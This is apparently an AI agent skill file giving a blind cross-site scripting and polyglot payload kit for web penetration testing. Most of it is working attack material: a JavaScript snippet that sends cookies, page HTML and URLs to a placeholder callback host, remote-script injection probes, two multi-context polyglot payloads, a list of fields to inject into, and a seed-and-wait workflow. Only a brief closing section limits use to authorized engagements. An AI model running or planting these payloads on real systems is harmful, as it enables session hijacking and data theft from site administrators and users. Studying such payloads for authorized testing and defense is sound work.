---
name: xss-blind-and-polyglot
description: Blind XSS (out-of-band callback) and polyglot payloads that fire across multiple injection contexts. Use when input is stored and rendered to a different user (admin panel, support ticket viewer, log dashboard) or when the reflection context is unknown.
---

# Blind XSS & Polyglots

## Blind XSS

Used when your payload executes in a context you cannot see — admin tools, log viewers, internal dashboards, email clients rendering HTML.

### Callback infrastructure

Use a dedicated callback host: XSS Hunter Express (self-hosted), Interactsh, Burp Collaborator, or a custom domain with a logging endpoint. Never use a target's own infrastructure.

### Minimal callback payload

```html
<script src="https://YOUR-CALLBACK/x.js"></script>
```

`x.js` payload should capture and exfiltrate:
```js
fetch('https://YOUR-CALLBACK/log', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,        // only if not HttpOnly
    dom: document.documentElement.outerHTML.slice(0, 50000),
    ua: navigator.userAgent,
    origin: location.origin
  })
});
```

### Injection vectors for blind XSS

- Support ticket subject / body
- User-Agent header (rendered in admin log viewers)
- Referer header
- Username / display name fields (rendered in admin user lists)
- File names of uploads
- Form fields rendered in receipt emails

### Stable blind probes

```
"><script src=//YOUR-CALLBACK></script>
'><script src=//YOUR-CALLBACK></script>
<img src=x onerror="import('//YOUR-CALLBACK/x.js')">
<svg/onload="fetch('//YOUR-CALLBACK/'+document.domain)">
javascript:fetch('//YOUR-CALLBACK/'+document.domain)
```

## Polyglots

A polyglot is a single payload that executes across multiple contexts. Useful when you cannot easily enumerate every reflection or when you have one shot (e.g. a stored field reflected in HTML, JS, and attribute contexts simultaneously).

### Classic polyglot (Gareth Heyes / 0xsobky)

```
javascript:/*--></title></style></textarea></script></noscript><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Shorter polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Why polyglots work

They simultaneously:
- Break out of `<title>`, `<style>`, `<textarea>`, `<script>`, `<noscript>` contexts
- Provide a valid `javascript:` URL handler
- Include both quoted and unquoted attribute breakouts
- Trigger via `onload`, `onclick`, `onmouseover`

## Workflow

**Blind:**
1. Stand up a callback host with logging.
2. Seed payloads into every storable field; record where each was injected.
3. Wait (hours to weeks). Correlate callbacks back to injection points via path / unique markers per field.

**Polyglot:**
1. Use as a first-pass probe when reflection context is unknown.
2. If it fires, narrow down to a clean context-specific payload for the report.

## Ethics

Blind XSS especially: only use on authorized engagements with explicit scope. Capturing admin sessions without authorization is a felony in most jurisdictions. Strip sensitive data from logs.
